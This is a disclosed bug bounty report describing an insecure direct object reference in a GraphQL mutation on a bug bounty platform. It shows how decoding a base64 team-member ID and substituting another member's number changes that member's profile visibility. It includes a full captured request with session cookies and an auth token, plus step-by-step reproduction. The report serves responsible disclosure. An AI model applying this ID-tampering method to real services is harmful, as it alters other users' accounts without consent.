# IDOR on Program Visibilty (Revealed / Concealed) against other team members

## Report Details
- **Report ID**: 291721
- **URL**: https://hackerone.com/reports/291721
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-11-19T16:26:01.374Z
- **Disclosed**: 2017-11-23T13:27:47.483Z

## Reporter
- **Username**: japz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Hi HackerOne Team,

**Summary:**

When you are a part of a program security team, you have a choice to show in your profile that you are a member of the sec team, you can also hide it if you don't want to show it to your profile, any team member can do that using your profile settings here: https://hackerone.com/settings/teams > Visibility > Revealed/Concealed.

__Important:__ ONLY YOU can do that to your profile settings, anyone is not allowed to do that, even other member of the security where you belong is not allowed.

However i have found a way to edit the visibility of any co-admin / co-member of the team where i belong using IDOR.

---

**Description (Include Impact):**

When you edit your team visibility the following __graphql__ `POST` request below is belong called.

```
POST /graphql HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTExMDc2Njd9.h_X6amYP8V-Y0tts_zg2jDudNeqx75fVfS5FZSczq1s----137042
origin: https://hackerone.com
Referer: https://hackerone.com/settings/teams
Content-Length: 574
Cookie: __cfduid=d3f42c3c5af53e3946c559d253a1fb9451511104348; _cfuid=c8d12dfb-fe68-4b32-bd94-d3664f3b9e9b; __Host-session=K3JDWXRpV00xL1RCTUI3QWx4YXUrUTZlb0xRSHBEQm9abXYrNm5EclhZTVM5VW1XMVg4aTQ2UmhZc2VGeW1yUDFoYndWMm1GSEVGazhISTZNeHppOFR5K3VmZXZuRE0xSWdCMk56dko2RzFHOFRpeGdlZzlKT0Y5ZjdWb1FScHo5S1d2b1A2cTFDa1FXYmRpS29GWGF5aUZlNUJRa1JDT25JL0RFZ242RUQyb0pNTktnOHk5L2NmOVJQZ2E0d3hEbm4yclk3WHRWOFJvdjRveVlvbVgyQ1hFSEliNDVTTFNrbzNqL096KzdZSkVXSEZ6TUFyelR4NEJmNjF4OE5aYmx6RzVvR2dNRnBGbEtCQVpxMXo2MCtqVUVIK1lzdkJpTnp2TkhiMnNCN08xZEljT1hVN1M2Y1dsMGphNnA2dmp2bTdxcm1WbkNPTHluWmgyVjFQcXdYZlM1c2ZaSFJDdnNOTmNySldhSkNqV0haNjhoMC8yVHpwMWFFYmJCTkxuTHdtNG9XbkV4UDN3ZmdjV0sxVzh3dm9jZ3RCVE9saXNmWHJMT0t4dmVuN3RwdVRuZnV4Y0ljWEM2a2QxRGVCWC0tS0dCTHpUVk9wY3RyZUpPRmZibWw1UT09--6c4b58c006e021c83b8e076370dcdc1efe40a984; app_signed_in=true
DNT: 1
Connection: close

{"query":"mutation Update_team_member_visibility_mutation($input_0:UpdateTeamMemberVisibilityMutationInput!) {\n  updateTeamMemberVisibility(input:$input_0) {\n    clientMutationId,\n    ...F1,\n    ...F2\n  }\n}\nfragment F0 on TeamMember {\n  id,\n  concealed\n}\nfragment F1 on UpdateTeamMemberVisibilityMutationPayload {\n  team_member {\n    id,\n    ...F0\n  }\n}\nfragment F2 on UpdateTeamMemberVisibilityMutationPayload {\n  errors\n}","variables":{"input_0":{"team_member_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW1NZW1iZXIvNDM3OTQ=","concealed":true,"clientMutationId":"1"}}}
```

You will observed these parameters 

```
{
"team_member_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW1NZW1iZXIvNDM3OTQ=",
"concealed":true,
"clientMutationId":"1"
}
```
__team_member_id__ contains base64 value: `Z2lkOi8vaGFja2Vyb25lL1RlYW1NZW1iZXIvNDM3OTQ=` , decoding it will show: `gid://hackerone/TeamMember/43794`

As you can see it will reveal your team member id, on my case it's `43794`

Now changing the value of `43794` to other team member id will result an Insecure Direct Object Reference attack against other team members.

__Vulnerable:__ `gid://hackerone/TeamMember/<victim_team_id_number>`

How to see other all other team members id, you can just simply go here: https://hackerone.com/parrot_sec/team_members.json , all team member id is on the list under `team_member_ids` attribute on the json response.

### Steps To Reproduce

1. Login and go to https://hackerone.com/settings/teams > __Visibility__
2. Click Concealed / 	Revealed to manipulate showing or hiding it in your profile.
3. Capture the request using burp (please see the graphql POST request above)
4. Decode the value of base64: "team_member_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW1NZW1iZXIvNDM3OTQ=" > `gid://hackerone/TeamMember/<team_member_id>`
5. Change the value of `<team_member_id>` to victims team member id (other team member)
6. Forward the request, your co-team member profile settings will be edited.

__NOTE:__ I ask permission to my friend which is member if parrot sec, I used this test profile https://hackerone.com/parrotsec1 to perform IDOR against this other team member profile: https://hackerone.com/phspade , both are team members of parrot sec. I successfully remove the public __Teams__ visibility of other team member @phspade without user interaction.

Let me know if anything else is needed.

Regards
@pinoywhitehat



## Attachments
- profile_settings_set_visibility.png
- public_teams_profile_view.png
